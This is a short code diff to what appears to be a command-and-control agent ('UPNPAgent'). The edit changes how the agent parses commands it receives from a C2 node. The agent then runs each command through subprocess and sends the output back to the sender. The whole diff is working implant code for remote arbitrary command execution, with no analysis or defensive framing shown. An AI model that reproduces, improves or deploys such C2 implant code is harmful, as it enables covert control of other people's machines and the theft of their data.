@@ -4,6 +4,7 @@ import argparse
 import logging
 import os
 import queue
+import shlex
 import subprocess
 import sys
 import threading
@@ -117,8 +118,8 @@ class UPNPAgent:
         elif not self.is_c2:
             if command == ord('c'):
                 print("\nReceived C2 Command ", message_content.decode('utf8'))
-                command_str = message_content.decode('utf8')
-                process = subprocess.Popen(command_str, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                command_args = shlex.split(message_content.decode('utf8'), posix=False) # Preserves quoted strings
+                process = subprocess.Popen(command_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                 stdout, stderr = process.communicate()
                 self.queue_message(agent_ip, b'm', (stdout + "\n" + stderr + "\n").encode('utf8'))
             elif command == ord('m'):
